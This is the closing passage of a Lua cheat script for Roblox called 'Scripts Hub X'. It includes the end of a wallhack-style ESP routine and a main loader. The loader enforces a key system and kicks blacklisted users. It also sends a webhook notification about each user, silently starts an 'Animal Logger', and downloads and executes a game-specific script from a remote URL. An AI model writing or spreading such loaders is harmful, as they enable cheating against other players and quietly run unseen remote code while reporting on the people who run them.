								espContainer.nameLabel = billboardGui
							end
						end
					end
				end
			end
		end)
	end
end

-- ================================
-- MAIN EXECUTION WITH KEY SYSTEM LOADER
-- ================================

spawn(function()
	print("🚀 Starting Scripts Hub X with Enhanced ESP and Key System Loader...")
	print("🔧 Key System Status: " .. (Keysystem and "ENABLED" or "DISABLED"))
	
	-- Check user status
	local userStatus = checkUserStatus()
	
	-- Handle blacklisted users
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	-- Handle key system for non-premium users (only if Keysystem is true)
	if userStatus == "regular" and Keysystem then
		print("🔑 Regular user detected - Loading key system...")
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("❌ Key system failed or timed out")
			notify("Scripts Hub X", "❌ Key verification failed or timed out.")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("🔓 Key system disabled - Bypassing for regular user")
		userStatus = "regular-bypassed"
	else
		print("✅ Premium/Staff/Owner user - Bypassing key system")
	end
	
	-- Check game support
	local isSupported, scriptUrl = checkGameSupport()
	
	-- Send webhook notification
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	-- Initialize Enhanced Animal Logger with ESP (silently)
	initializeAnimalLogger()
	
	-- Handle unsupported games
	if not isSupported then
		print("❌ Game not supported")
		notify("Scripts Hub X", "❌ Game is not supported yet.")
		return
	end
	
	-- Load and execute the game script
	print("🎮 Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("✅ Scripts Hub X | Complete for " .. userStatus .. " user")
		if userStatus == "regular-keyed" then
			notify("Scripts Hub X", "✅ Key verified! Script loaded successfully.")
		elseif userStatus == "regular-bypassed" then
			notify("Scripts Hub X", "✅ Script loaded successfully (Key system bypassed).")
		end
	else
		print("❌ Script failed to load: " .. tostring(errorMsg))
	end
end)
